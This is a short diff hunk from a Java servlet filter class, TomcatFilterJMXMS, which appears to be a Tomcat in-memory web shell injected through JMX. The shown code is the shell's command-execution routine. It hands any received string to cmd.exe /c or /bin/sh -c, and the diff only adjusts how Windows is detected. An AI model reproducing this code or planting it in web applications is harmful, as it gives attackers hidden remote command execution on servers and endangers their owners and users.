@@ -128,7 +128,7 @@ public class TomcatFilterJMXMS implements Filter {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
